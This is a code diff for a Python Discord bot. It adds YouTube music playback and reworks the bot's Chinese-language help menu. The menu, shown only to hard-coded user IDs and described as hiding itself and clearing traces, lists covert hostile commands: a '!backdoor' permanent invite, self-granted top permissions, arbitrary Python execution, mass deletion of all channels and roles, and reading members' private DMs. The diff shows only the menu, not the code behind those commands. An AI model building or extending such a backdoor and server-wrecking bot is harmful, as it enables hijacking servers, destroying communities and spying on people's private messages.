@@ -11,6 +11,7 @@ import json
 import io
 import ctypes
 import shutil
+import yt_dlp
 from ffmpeg_downloader import download_ffmpeg
 ffmpeg_exe = "ffmpeg"
 if not shutil.which("ffmpeg"):
@@ -27,6 +28,8 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 ALLOWED_IDS = [1008278721007992863, 1355108796388872292]
 VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
+YTDL_OPTIONS = {'format': 'bestaudio/best', 'noplaylist': True}
+FFMPEG_OPTIONS = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'}
 
 async def is_me(ctx):
     if ctx.author.id in ALLOWED_IDS:
@@ -63,7 +66,6 @@ async def help_msg(ctx):
         description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
         color=0x2b2d31
     )
-    
     embed.add_field(
         name="🛡️ 基礎管理", 
         value=(
@@ -73,19 +75,24 @@ async def help_msg(ctx):
             "`!set_server [名]` - 修改伺服器名稱\n"
             "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
             "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
-            "`!clean_keyword [詞] [數]` - 刪除特定關鍵字\n"
             "`!del_msg [數]` - 批次清理訊息\n"
-            "`!disrole @成員` - 剝奪對方身分\n"
-            "`!add_role @成員 @組` - 給予身分組\n"
-            "`!remove_role @成員 @組` - 移除身分組\n"
             "`!backdoor` - 獲取永久邀請連結\n"
             "`!move_all [頻道ID]` - 強制全體移動語音\n"
         ), 
         inline=False
     )
-    
     embed.add_field(
-        name="🔥 破壞", 
+        name="🎵 語音與掛台",
+        value=(
+            "`!join` - 加入你所在的語音頻道\n"
+            "`!stop` - 解除掛台目標並退出語音\n"
+            "`!p [URL]` - 播放 YouTube 音訊\n"
+            "`!s` - 停止播放音樂\n"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🔥 破壞系統", 
         value=(
             "`!del_ch` - 刪除所有頻道\n"
             "`!del_role` - 刪除所有身分組\n"
@@ -95,27 +102,24 @@ async def help_msg(ctx):
         ), 
         inline=False
     )
-    
     embed.add_field(
         name="🛠️ 進階工具", 
         value=(
             "`!eval [code]` - 執行動態 Python 腳本\n"
-            "`!snapshot` - 導出伺服器完整結構 JSON\n"
+            "`!snapshot` - 導出伺服器完整結構\n"
             "`!op_me` - 獲取最高權限\n"
-            "`!reset` - 強制重啟系統實例\n"
+            "`!reset` - 強制重啟系統\n"
         ), 
         inline=False
     )
-
     embed.add_field(
-        name="🎮 有趣系統", 
+        name="🎮 監控與私訊", 
         value=(
             "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
             "`!dm @成員 [文]` - 以機器人名義私訊\n"
         ), 
         inline=False
     )
-    
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
 
@@ -385,7 +389,22 @@ async def dc(ctx):
     if ctx.voice_client:
         try: await ctx.voice_client.disconnect()
         except: pass
-            
+
+@bot.command()
+async def p(ctx, *, url):
+    if not await is_me(ctx): return
+    
+    if not ctx.voice_client:
+        await ctx.author.voice.channel.connect()
+
+    async with ctx.typing():
+        with yt_dlp.YoutubeDL(YTDL_OPTIONS) as ydl:
+            info = ydl.extract_info(url, download=False)
+            url2 = info['url']
+            source = await discord.FFmpegOpusAudio.from_probe(url2, **FFMPEG_OPTIONS)
+            ctx.voice_client.play(source)
+    await ctx.send(f"🎶 正在播放: **{info['title']}**")
+    
 @bot.event
 async def on_message(message):
     if message.author == bot.user: return
